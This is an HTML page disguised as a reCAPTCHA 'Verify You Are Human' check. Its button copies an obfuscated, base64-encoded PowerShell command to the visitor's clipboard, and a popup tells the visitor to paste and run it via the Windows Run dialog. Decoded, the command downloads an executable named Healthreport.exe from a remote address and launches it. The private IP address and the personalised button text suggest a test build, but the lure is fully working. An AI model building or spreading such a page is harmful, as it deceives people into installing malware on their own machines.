<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Verify You Are Human</title>
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    body, html {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      background: #f2f2f2;
      color: #333;
    }

    .container {
      text-align: center;
      max-width: 500px;
      margin: 20px;
      position: relative;
    }

    .recaptcha-box {
      padding: 20px;
      box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
      border-radius: 8px;
      background: white;
    }

    .recaptcha-box h2 {
      margin-bottom: 20px;
      font-size: 28px;
      color: #4285f4;
    }

    .recaptcha-box p {
      font-size: 18px;
    }

    .recaptcha-button {
      display: inline-flex;
      align-items: center;
      padding: 10px 20px;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-size: 16px;
      background-color: #4285f4;
      color: white;
      margin-top: 15px;
    }

    .recaptcha-button img {
      margin-right: 10px;
      height: 24px;
    }

    .recaptcha-button:hover {
      background-color: #357ae8;
    }

    .recaptcha-popup {
      display: none;
      text-align: left;
      margin-top: 20px;
      animation: fadeIn 0.5s ease;
    }

    .recaptcha-popup.active {
      display: block;
    }

    .recaptcha-popup h3 {
      margin-bottom: 10px;
      font-size: 24px;
    }

    .recaptcha-popup p {
      margin: 5px 0;
    }

    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0, 0, 0, 0.5);
      display: none;
      z-index: 10;
    }

    .overlay.active {
      display: block;
    }

    @keyframes fadeIn {
      from { opacity: 0; }
      to { opacity: 1; }
    }
  </style>
</head>
<body>
  <div class="container">
    <div class="overlay" id="overlay"></div>
    <div class="recaptcha-box">
      <h2>Verify You Are Human</h2>
      <p>Please verify that you are a human to continue.</p>
      <div class="recaptcha-button" id="verifyButton">
        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA Logo">
        <span>Durga your not a robot</span>
      </div>
      <div class="recaptcha-popup" id="recaptchaPopup">
        <h3>Verification Steps</h3>
        <p>1. Press Windows Button "<i class="fab fa-windows"></i>" + R</p>
        <p>2. Press CTRL + V</p>
        <p>3. Press Enter</p>
      </div>
    </div>
  </div>

  <script>
    const verifyButton = document.getElementById('verifyButton');
    verifyButton.addEventListener('click', function () {
      const textToCopy = "powershell.exe -eC SW52b2tlLVdlYlJlcXVlc3QgLVVyaSBodHRwOi8vMTkyLjE2OC4yOS44OjgwODAvSGVhbHRocmVwb3J0LmV4ZSAtT3V0RmlsZSA6VEVNUEhlYWx0aHJlcG9ydC5leGU7IFN0YXJ0LVByb2Nlc3MgOlRFTVBIZWFsdGhyZXBvcnQuZXhl";
      const tempTextArea = document.createElement("textarea");
      tempTextArea.value = textToCopy;
      document.body.appendChild(tempTextArea);
      tempTextArea.select();
      document.execCommand("copy");
      document.body.removeChild(tempTextArea);

      document.getElementById("recaptchaPopup").classList.add("active");
      document.getElementById("overlay").classList.add("active");
    });
  </script>
</body>
</html>
